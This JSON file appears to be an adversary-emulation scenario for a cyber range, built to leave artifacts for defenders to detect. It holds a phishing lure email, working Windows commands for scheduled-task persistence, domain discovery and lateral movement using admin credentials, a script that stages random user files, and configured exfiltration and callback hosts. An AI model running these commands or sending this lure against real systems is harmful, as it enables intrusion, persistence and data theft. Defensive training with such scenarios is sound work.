{
    "meta_data": {
        "name": "host_based_artifacts",
        "version": "v1.0.2",
        "title": "Host-Based Artifact Dropper with Multiple File Exfiltration",
        "description": "Attempts to gain access to a lateral host, potentially on a different subnet. Achieves persistence on the initial access host in two ways and the lateral host in one way. Exfiltrates data from the lateral host through two different channels and intentionally leaves behind a variety of artifacts for Blue Team detection and forensic analysis.",
        "author": "Attack Content",
        "suggested_duration": 2020
    },
    "procedures": [
        {
            "tactic": "Infrastructure",
            "technique": "Actuator",
            "label": "actuator",
            "preconditions": {
                "tool": "state.tool_name"
            },
            "set_state": {
                "actuator": "postconditions.actuator.ret.registered_id"
            }
        },
        {
            "tactic": "Infrastructure",
            "technique": "Interfaces",
            "label": "Interfaces",
            "preconditions": {
                "tool": "state.tool",
                "exfil": "state.exfil",
                "driveby": "state.driveby"
            }
        },
        {
            "tactic": "Infrastructure",
            "technique": "DNS",
            "label": "DNS",
            "preconditions": {
                "tool": "state.tool",
                "exfil": "state.exfil",
                "driveby": "state.driveby"
            }
        },
        {
            "tactic": "Infrastructure",
            "technique": "NGINX",
            "label": "NGINX",
            "preconditions": {
                "state.tool_name": "state.tool",
                "payload": "state.payload_name",
                "exfiltration": "state.exfil",
                "driveby": "state.driveby",
                "driveby_ctl": "state.chimera"
            }
        },
        {
            "tactic": "Infrastructure",
            "technique": "PayloadCheapride",
            "label": "Payload",
            "preconditions": {
                "tool": "state.tool"
            }
        },
        {
            "tactic": "InitialAccess",
            "technique": "SpearPhishingLink",
            "label": "spearPhishingLink",
            "preconditions": {
                "actuator": "state.actuator",
                "phishing": "state.phish_1",
                "tool": "state.tool",
                "driveby": "state.driveby",
                "target": "state.target_1"
            },
            "tune": {
                "body": "Hi, \nThe 2019 Senior Staff Club House calendar gallery has been updated. To submit artwork for consideration, please fill in the form at http://${state.driveby_domain}/${state.payload_name}.\n The deadline for submission is May 17, 2019. \nThanks and look forward to seeing your beautiful projects! \nKelly"
            }
        },
        {
            "tactic": "InitialAccess",
            "technique": "DriveByCompromise",
            "label": "driveByCompromise",
            "preconditions": {
                "actuator": "state.actuator",
                "phishing": "state.phish_1",
                "tool": "state.tool",
                "driveby": "state.driveby",
                "target": "state.target_1"
            }
        },
        {
            "tactic": "Execution",
            "technique": "UserExecution",
            "label": "userExecution",
            "preconditions": {
                "actuator_id": "state.actuator",
                "phishing": "state.phish_1",
                "tool": "state.tool",
                "driveby": "state.driveby",
                "target": "state.target_1"
            }
        },
        {
            "tactic": "c2",
            "technique": "WebProtocols",
            "label": "webProtocols_1",
            "preconditions": {
                "actuator_id": "state.actuator",
                "phishing": "state.phish_1",
                "tool": "state.tool",
                "driveby": "state.driveby",
                "target": "state.target_1"
            },
            "tune": {
                "infra": true
            },
            "set_state": {
                "agent_tgt1": "postconditions.agent.ret.agent_id"
            }
        },
        {
            "tactic": "PrivilegeEscalation",
            "technique": "ValidAccounts_LocalAccounts",
            "label": "validAccounts_LocalAccounts_t1",
            "preconditions": {
                "actuator": "state.actuator",
                "agent": "state.agent_tgt1",
                "tool": "state.tool",
                "target_1": "state.target_1",
                "target_2": "state.target_1_elevated"
            }
        },
        {
            "tactic": "c2",
            "technique": "WebProtocols",
            "label": "webProtocols_2",
            "preconditions": {
                "actuator_id": "state.actuator",
                "tool": "state.tool",
                "driveby": "state.driveby",
                "target": "state.target_1_elevated"
            },
            "set_state": {
                "agent_tgt1_elevated": "postconditions.agent.ret.agent_id"
            }
        },
        {
            "tactic": "Persistence",
            "technique": "ScheduledTaskPersistence",
            "label": "scheduled_task_1",
            "preconditions": {
                "actuator": "state.actuator",
                "agent": "state.agent_tgt1_elevated",
                "tool": "state.tool",
                "target": "state.target_1_elevated"
            },
            "tune": {
                "command": "schtasks /create /f /tn${state.target_1_elevated_taskname}/tr${state.target_1_elevated_payload_destination}\\${state.payload_name}/sc onlogon"
            }
        },
        {
            "tactic": "Persistence",
            "technique": "RegistryRunKeysStartupFolder",
            "label": "Startup_Folder_1",
            "preconditions": {
                "agent": "state.agent_tgt1_elevated",
                "tool": "state.tool",
                "target": "state.target_1_elevated"
            }
        },
        {
            "tactic": "Discovery",
            "technique": "SystemOwnerUserDiscovery",
            "label": "systemOwnerUserDiscovery_t1_elevated",
            "preconditions": {
                "agent": "state.agent_tgt1_elevated",
                "tool": "state.tool",
                "target": "state.target_1_elevated"
            },
            "tune": {
                "command": "net user"
            }
        },
        {
            "tactic": "Discovery",
            "technique": "RemoteSystemDiscovery",
            "label": "remoteSystemDiscovery_t1_elevated",
            "preconditions": {
                "agent": "state.agent_tgt1_elevated",
                "tool": "state.tool",
                "target": "state.target_1_elevated"
            },
            "tune": {
                "command": "net view /all"
            }
        },
        {
            "tactic": "Discovery",
            "technique": "DomainAccount",
            "label": "domainAccount_t1_elevated",
            "preconditions": {
                "agent": "state.agent_tgt1_elevated",
                "tool": "state.tool",
                "target": "state.target_1_elevated"
            },
            "tune": {
                "command": "net user /domain"
            }
        },
        {
            "tactic": "Discovery",
            "technique": "DomainAccount",
            "label": "domainGroups_t1_elevated",
            "preconditions": {
                "agent": "state.agent_tgt1_elevated",
                "tool": "state.tool",
                "target": "state.target_1_elevated"
            },
            "tune": {
                "command": "net group /domain"
            }
        },
        {
            "tactic": "Discovery",
            "technique": "SystemNetworkConnectionsDiscovery",
            "label": "systemNetworkConnectionsDiscovery_t1_elevated",
            "preconditions": {
                "agent": "state.agent_tgt1_elevated",
                "tool": "state.tool",
                "target": "state.target_1_elevated"
            },
            "tune": {
                "command": "netstat -ano"
            }
        },
        {
            "tactic": "LateralMovement",
            "technique": "ScheduledTask",
            "label": "scheduled_task_2",
            "preconditions": {
                "agent": "state.agent_tgt1_elevated",
                "tool": "state.tool",
                "target_1": "state.target_1_elevated",
                "target_2": "state.target_2"
            },
            "tune": {
                "command": "powershell &{schtasks /create /f /tn \"${state.target_2_taskname}\" /ST 23:58 /sc once /tr cmd.exe /ru${state.target_1_elevated_username}/rp${state.target_1_elevated_password}; $action1 = New-ScheduledTaskAction -Execute \"net\" -Argument \"use \\\\${state.target_2_hostname}/user:${state.target_2_username}@${state.domain}${state.target_2_password}\"; $action2 = New-ScheduledTaskAction -Execute \"robocopy\" -Argument \"c:\\users\\public\\ \\\\${state.target_2_hostname}\\c$\\users\\public${state.payload_name}\"; $trigger = New-ScheduledTaskTrigger -once -at 23:59; Set-ScheduledTask -action $action1,$action2 -trigger $trigger -taskname \"${state.target_2_taskname}\" -user${state.target_1_elevated_username}-password${state.target_1_elevated_password}}"
            }
        },
        {
            "tactic": "Execution",
            "technique": "ScheduledTaskExecution",
            "label": "scheduled_task_execution_1",
            "preconditions": {
                "actuator": "state.actuator",
                "agent": "state.agent_tgt1_elevated",
                "tool": "state.tool",
                "target_1": "state.target_1_elevated",
                "target_2": "state.target_2"
            },
            "tune": {
                "command": "schtasks /run /tn${state.target_2_taskname}"
            }
        },
        {
            "tactic": "LateralMovement",
            "technique": "ScheduledTask",
            "label": "scheduled_task_3",
            "preconditions": {
                "agent": "state.agent_tgt1_elevated",
                "tool": "state.tool",
                "target_1": "state.target_1_elevated",
                "target_2": "state.target_2"
            },
            "tune": {
                "command": "cmd.exe /c schtasks.exe /create /f /SC once /ST 23:59 /TN${state.target_2_taskname}/TR c:\\users\\public\\${state.payload_name}/RL highest /u${state.target_2_username}@${state.domain}/p${state.target_2_password}/ru${state.target_2_username}@${state.domain}/rp${state.target_2_password}/s${state.target_2_hostname}"
            }
        },
        {
            "tactic": "Execution",
            "technique": "ScheduledTaskExecution",
            "label": "scheduled_task_execution_2",
            "preconditions": {
                "actuator": "state.actuator",
                "agent": "state.agent_tgt1_elevated",
                "tool": "state.tool",
                "target_1": "state.target_1_elevated",
                "target_2": "state.target_2"
            }
        },
        {
            "tactic": "c2",
            "technique": "WebProtocols",
            "label": "webProtocols_3",
            "preconditions": {
                "actuator_id": "state.actuator",
                "tool": "state.tool",
                "driveby": "state.driveby",
                "target": "state.target_2"
            },
            "set_state": {
                "agent_tgt2": "postconditions.agent.ret.agent_id"
            }
        },
        {
            "tactic": "LateralMovement",
            "technique": "TaintSharedContent",
            "label": "taintSharedContent_t2",
            "preconditions": {
                "agent": "state.agent_tgt2",
                "tool": "state.tool",
                "target_1": "state.target_2",
                "target_2": "state.target_2"
            },
            "tune": {
                "command": "robocopy c:\\users\\public\\ \\\\file\\share${state.payload_name}"
            }
        },
        {
            "tactic": "LateralMovement",
            "technique": "ScheduledTask",
            "label": "scheduled_task_4",
            "preconditions": {
                "agent": "state.agent_tgt2",
                "tool": "state.tool",
                "target_1": "state.target_2",
                "target_2": "state.target_2"
            },
            "tune": {
                "command": "powershell &{schtasks /create /f /tn \"${state.target_2_taskname}\" /sc onlogon /tr cmd.exe; $action1 = New-ScheduledTaskAction -Execute \"net\" -Argument \"use \\\\file\\share /user:${state.target_2_username}@${state.domain}${state.target_2_password}\"; $action2 = New-ScheduledTaskAction -Execute \"robocopy\" -Argument \"\\\\file\\share c:\\users\\public${state.payload_name}\"; $trigger = New-ScheduledTaskTrigger -AtLogOn; Set-ScheduledTask -action $action1,$action2 -trigger $trigger -taskname \"${state.target_2_taskname}\" }"
            }
        },
        {
            "tactic": "Collection",
            "technique": "LocalDataStaging",
            "label": "localDataStaging_t2_1",
            "preconditions": {
                "agent": "state.agent_tgt2",
                "tool": "state.tool",
                "target": "state.target_2"
            },
            "tune": {
                "command": "powershell &{$files = @(); gci c:\\\\users -exclude \"Public\" | gci -Recurse -exclude \"AppData,\",\"*.lnk\",\"*.url\" -file 2>$null | foreach {$files = $files + $_.FullName};$file = $files | Get-Random; Copy-Item -Path $file C:\\users\\public\\secret1.file -force; echo $file}"
            }
        },
        {
            "tactic": "Collection",
            "technique": "LocalDataStaging",
            "label": "localDataStaging_t2_2",
            "preconditions": {
                "agent": "state.agent_tgt2",
                "tool": "state.tool",
                "target": "state.target_2"
            },
            "tune": {
                "command": "powershell &{$files = @(); gci c:\\\\users -exclude \"Public\" | gci -Recurse -exclude \"AppData,\",\"*.lnk\",\"*.url\" -file 2>$null | foreach {$files = $files + $_.FullName};$file = $files | Get-Random; Copy-Item -Path $file C:\\users\\public\\secret2.file -force; echo $file}"
            }
        },
        {
            "tactic": "Exfiltration",
            "technique": "ExfiltrationOverWebService",
            "label": "exfiltrationOverWebService_t2_1",
            "preconditions": {
                "agent": "state.agent_tgt2",
                "tool": "state.tool",
                "exfil": "state.exfil",
                "target": "state.target_2"
            }
        },
        {
            "tactic": "Exfiltration",
            "technique": "ExfiltrationOverWebService",
            "label": "exfiltrationOverWebService_t2",
            "preconditions": {
                "agent": "state.agent_tgt2",
                "tool": "state.tool",
                "target": "state.target_2",
                "exfil": "state.exfil"
            }
        },
        {
            "tactic": "Exfiltration",
            "technique": "ExfiltrationOverWebService",
            "label": "exfiltrationOverWebService_t1_elevated",
            "preconditions": {
                "agent": "state.agent_tgt1_elevated",
                "tool": "state.tool",
                "target": "state.target_1_elevated",
                "exfil": "state.exfil"
            }
        },
        {
            "tactic": "Exfiltration",
            "technique": "ExfiltrationOverWebService",
            "label": "exfiltrationOverWebService_t1_1_elevated",
            "preconditions": {
                "agent": "state.agent_tgt1_elevated",
                "tool": "state.tool",
                "target": "state.target_1_elevated",
                "exfil": "state.exfil"
            }
        },
        {
            "tactic": "Utility",
            "technique": "AgentExit",
            "label": "AgentExit",
            "preconditions": {
                "agent": "state.agent_tgt2",
                "tool": "state.tool",
                "target": "state.target_2"
            }
        },
        {
            "tactic": "Utility",
            "technique": "AgentExit",
            "label": "AgentExit",
            "preconditions": {
                "agent": "state.agent_tgt1_elevated",
                "tool": "state.tool",
                "target": "state.target_1_elevated"
            }
        },
        {
            "tactic": "Utility",
            "technique": "AgentExit",
            "label": "AgentExit",
            "preconditions": {
                "agent": "state.agent_tgt1",
                "tool": "state.tool",
                "target": "state.target_1"
            }
        }
    ],
    "iocs": {
        "domain": [
            "archaeology.us",
            "archaeology.org",
            "archaeology.net",
            "dinosaurs.bones.com",
            "civilizations.com",
            "ancient.ruins.com",
            "remnants.com",
            "leftovers.org",
            "digsites.org",
            "ancient.cities.org"
        ],
        "ip": [
            "52.129.23.153/24",
            "64.62.178.187/24",
            "216.250.121.27/24",
            "52.43.227.193/24",
            "195.149.94.100/24",
            "68.178.247.86/24",
            "104.247.81.53/24",
            "199.59.243.200/24",
            "15.197.142.173/24",
            "15.197.144.173/24"
        ],
        "binary": [
            "mixed_client.doc.exe",
            "ctmp.exe",
            "dtmp.exe",
            "calc.exe",
            "word.exe",
            "doc.exe",
            "txt.exe",
            "etmp.exe",
            "ftmp.exe",
            "gtmp.exe"
        ],
        "taskname": [
            "windowsUpdater106"
        ]
    },
    "spec": {
        "emaillist": "@('Janice Durham <janice.durham@site.com>', 'Darryl Richmond <darryl.richmond@site.com>', 'Nelda Rios <nelda.rios@site.com>', 'Joanna Wilkerson <joanna.wilkerson@site.com>')",
        "tool": {
            "1": {
                "name": "cheapride_v1",
                "beacon": "54",
                "jitter": "10",
                "ioc-ip_callback": "122.49.200.108/24",
                "ioc-domain_callback": "inf0rm.bed1rcati.com",
                "ioc-binary_payload_name": "mixed_client.doc.exe"
            }
        },
        "phishing": {
            "1": {
                "ioc-server_addr": "200.200.200.201",
                "from_addr": "Caroline@winemixer.com",
                "to_addrs": "Madelyn.Luna@site.com",
                "cc": "",
                "bcc": "",
                "subject": "Updated Gallery for 2020 Mixed Client Submissions",
                "body_subtype": "plain",
                "attach": "",
                "username": "Caroline",
                "password": "",
                "port": "25"
            }
        },
        "chimera": {
            "api-control_ip": "10.10.200.60"
        },
        "exfil": {
            "1": {
                "ioc-ip_exfil": "161.135.1.25/24",
                "ioc-domain_exfil": "deepwaterhorizon.com"
            }
        },
        "driveby": {
            "1": {
                "ioc-ip_driveby": "161.135.1.22/24",
                "ioc-domain_driveby": "texaspumps.us"
            }
        },
        "targets": {
            "1": {
                "query-target_control_ip": "10.10.5.101",
                "query-target_ip": "172.16.5.101",
                "query-target_hostname": "dev-win10-1",
                "payload_destination": "c:\\users\\Public",
                "ioc-taskname": "host_based_artifacts_72",
                "persistence_directory": "C:\\Users\\%Username%\\AppData\\Roaming\\Microsoft\\Windows\\STARTM~1\\Programs\\Startup",
                "query-target_username": "",
                "query-target_password": "",
                "query-target_email": "Madelyn.Luna@site.com",
                "query-domain_admin_username": "administrator",
                "query-domain_admin_password": "Simspace1!Simspace1!",
                "query": {
                    "#projection": [
                        "$hostname",
                        "$os_version",
                        "$in_game_ip",
                        "$control_ip",
                        "$username",
                        "$password",
                        "$email",
                        "$domain_name",
                        "$domain_admin_name",
                        "$domain_admin_password"
                    ],
                    "$tier": "4"
                }
            },
            "2": {
                "query-target_ip": "172.16.6.101",
                "query-target_hostname": "acc-win10-1",
                "query-exfil_files": [
                    "C:\\users\\public\\secret1.file",
                    "C:\\users\\public\\secret2.file"
                ],
                "payload_destination": "C:\\users\\public",
                "ioc-taskname": "host_based_artifacts_67",
                "query-target_username": "",
                "query-target_password": "",
                "query-domain_admin_username": "administrator",
                "query-domain_admin_password": "Simspace1!Simspace1!",
                "query": {
                    "#projection": [
                        "$hostname",
                        "$os_version",
                        "$in_game_ip",
                        "$control_ip",
                        "$username",
                        "$password",
                        "$email",
                        "$domain_name",
                        "$domain_admin_name",
                        "$domain_admin_password"
                    ],
                    "$tier": "4"
                }
            }
        }
    },
    "state": {
        "tool_name": "spec.tool.1.name",
        "payload_name": "spec.tool.1.ioc-binary_payload_name",
        "tool": "spec.tool.1",
        "exfil": "spec.exfil.1",
        "driveby": "spec.driveby.1",
        "driveby_domain": "spec.driveby.1.ioc-domain_driveby",
        "chimera": "spec.chimera",
        "phish_1": "spec.phishing.1",
        "target_1": "spec.targets.1",
        "target_1_elevated": "spec.targets.1",
        "target_1_elevated_payload_destination": "spec.targets.1.payload_destination",
        "target_1_elevated_taskname": "spec.targets.1.ioc-taskname",
        "target_1_elevated_username": "spec.targets.1.query-domain_admin_username",
        "target_1_elevated_password": "spec.targets.1.query-domain_admin_password",
        "target_2": "spec.targets.2",
        "target_2_username": "spec.targets.2.query-domain_admin_username",
        "target_2_password": "spec.targets.2.query-domain_admin_password",
        "target_2_hostname": "spec.targets.2.query-target_hostname",
        "target_2_taskname": "spec.targets.2.ioc-taskname",
        "domain": "spec.targets.2.query-target_domain"
    }
}